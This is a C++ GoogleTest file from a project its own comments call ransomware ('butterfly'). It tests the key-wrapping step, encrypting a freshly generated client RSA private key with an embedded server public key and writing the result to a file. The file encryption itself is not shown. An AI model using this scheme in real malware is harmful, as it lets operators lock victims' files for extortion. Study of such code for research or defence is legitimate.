#include <memory>
#include <gtest/gtest.h>

#include "crypto/rsaEncryptor.h"
#include "crypto/serverPublicKey.h"
#include "bflyParams.h"

/**
 * Testclass RSAEncryptorTest
 */
class RSAEncryptorTest : public ::testing::Test
{

protected:
    int rsaKeysize = 2048;
    std::unique_ptr<butterfly::rsa::RSAEncryptor> rsaEncryptAESKey;
    std::unique_ptr<butterfly::rsa::RSAEncryptor> rsaEncryptCPrivateRSA;

    void SetUp() override
    {
        // Init rsaEncryptCPrivateRSA with Server Public Key embedded in ransomware
        rsaEncryptCPrivateRSA = std::unique_ptr<butterfly::rsa::RSAEncryptor>(new butterfly::rsa::RSAEncryptor(butterfly::rsa::SPUBLIC_PEM));
        // Init rsaEncryptAESKey with keysize 2048
        rsaEncryptAESKey = std::unique_ptr<butterfly::rsa::RSAEncryptor>(new butterfly::rsa::RSAEncryptor(rsaKeysize));
        // TODO Encrypt the AES.bin file
    }

    void TearDown() override
    {

    }
};

/**
 * Testcase for RSA Encryption
 */
TEST_F(RSAEncryptorTest, rsaEncryption)
{
    std::string cprivateRSAKeyFile = rsaEncryptAESKey->getRSAPrivateKeyStr();
    ASSERT_TRUE(!cprivateRSAKeyFile.empty());

    int encMSGLen = rsaEncryptCPrivateRSA->encryptEVP(rsaEncryptCPrivateRSA->getEvpPkey(), cprivateRSAKeyFile, butterfly::RSAKEY_TYPE::CPRIVATE_RSA);
    ASSERT_TRUE(encMSGLen != -1);

    std::string encCPrivateRSA = rsaEncryptCPrivateRSA->getEncryptedMessage();
    ASSERT_TRUE(!encCPrivateRSA.empty());

    rsaEncryptCPrivateRSA->writeEncMSGToFile(butterfly::ENC_CPRIVATERSA_FILENAME, encCPrivateRSA, encMSGLen);
}
